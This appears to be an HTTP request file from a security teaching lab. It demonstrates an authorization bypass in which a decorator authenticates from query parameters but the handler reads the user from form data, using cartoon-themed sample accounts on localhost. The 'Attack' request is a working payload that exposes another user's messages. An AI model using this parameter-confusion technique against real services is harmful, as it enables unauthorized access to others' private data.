@base = http://localhost:8000/ii/cross-component-parse

### Expected Usage:
GET {{base}}/example2?user=spongebob&password=bikinibottom
#
# Normally, SpongeBob would get his *own* messages:
#
# {
#   "owner": "spongebob",
#   "messages": [
#     {
#       "from": "patrick",
#       "message": "Hey SpongeBob, wanna go jellyfishing?"
#     }
#   ]
# }
#

###

### Attack: Decorator authenticates using query params, handler uses form data
GET {{base}}/example2?user=spongebob&password=bikinibottom
Content-Type: application/x-www-form-urlencoded

user=squidward
#
# SpongeBob gets Squidward's messages, even though he provided his own password!
#
# {
#   "owner": "squidward",
#   "messages": [
#     {
#       "from": "plankton",
#       "message": "Squidward, I'll pay you handsomely to 'accidentally' share the secret formula. You deserve better than that dead-end cashier job!"
#     },
#     {
#       "from": "mr.krabs",
#       "message": "Squidward, the new safe combination is 4-2-0-6-9. Don't write it down anywhere!"
#     }
#   ]
# }
